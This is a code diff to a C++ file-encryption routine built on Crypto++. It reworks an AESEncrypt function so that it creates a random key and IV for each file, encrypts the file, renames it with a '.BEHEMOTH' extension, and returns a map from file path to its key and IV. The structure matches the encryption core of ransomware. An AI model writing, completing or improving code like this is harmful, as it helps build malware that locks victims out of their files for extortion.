@@ -12,12 +12,14 @@
 #include "file_enc.h"
 
 
-bool AESEncrypt(const std::string& filePath, std::string& key, std::string& iv)
+std::map<std::string, std::map<std::string, std::string>> AESEncrypt(const std::string& filePath)
 {
     using namespace CryptoPP;
 
-    key = gen_str(32);
-    iv = gen_str(12);
+    std::string key = gen_str(32);
+    std::string iv = gen_str(12);
+    std::map<std::string, std::map<std::string, std::string>> result;
+    std::string newFilePath = filePath + ".BEHEMOTH";
 
     try
     {
@@ -28,7 +30,7 @@ bool AESEncrypt(const std::string& filePath, std::string& key, std::string& iv)
         if (!inputFile)
         {
             std::cerr << "Error opening input file" << std::endl;
-            return false;
+            return result;
         }
 
         // Read the input file content
@@ -39,7 +41,7 @@ bool AESEncrypt(const std::string& filePath, std::string& key, std::string& iv)
         if (!outputFile)
         {
             std::cerr << "Error opening output file" << std::endl;
-            return false;
+            return result;
         }
 
         StringSource ss(inputContent, true,
@@ -49,15 +51,19 @@ bool AESEncrypt(const std::string& filePath, std::string& key, std::string& iv)
         );
 
         outputFile.close();
-        std::filesystem::rename(filePath, filePath + ".BEHEMOTH");
+
+        // Rename the file to add an extra extension
+        std::filesystem::rename(filePath, newFilePath);
     }
     catch (const CryptoPP::Exception& e)
     {
         std::cerr << e.what() << std::endl;
-        return false;
+        return result;
     }
 
-    return true;
+    result[newFilePath] = { {"key", key}, {"iv", iv} };
+    return result;
 }
+
 
 
